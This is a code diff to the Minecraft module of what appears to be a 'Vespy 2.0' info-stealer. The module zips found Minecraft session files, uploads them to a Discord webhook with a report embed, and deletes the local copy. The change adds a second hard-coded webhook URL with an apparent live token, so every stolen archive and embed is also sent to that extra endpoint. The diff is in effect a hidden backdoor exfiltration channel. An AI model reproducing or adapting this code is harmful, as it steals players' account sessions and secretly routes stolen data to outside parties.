@@ -20,11 +20,14 @@ class Minecraft:
             pass
     
     def send(self,_):
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
-        webhook.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
-        webhook.execute()
+        dual = r'https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
+        webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook1.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
+        webhook2.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
+        webhook1.execute()
+        webhook2.execute()
 
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
         embed = DiscordEmbed(title=f"Minecraft Session", description=f"Found A Minecraft Session", color='4300d1')
         embed.set_author(name="author : Beadiddd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
         embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
@@ -33,6 +36,8 @@ class Minecraft:
         embed.add_embed_field(name=f":video_game: Type :ㅤㅤㅤ", value=f"``{self.typE}``")
         embed.add_embed_field(name=f":id: Remote ID :ㅤㅤㅤ", value=f"``{self.idd}``")
         embed.add_embed_field(name=f"\n:open_file_folder: Files Found", value=f"```{self.content}```")
-        webhook.add_embed(embed)
-        webhook.execute()
+        webhook1.add_embed(embed)
+        webhook2.add_embed(embed)
+        webhook1.execute()
+        webhook2.execute()
         os.remove(_)
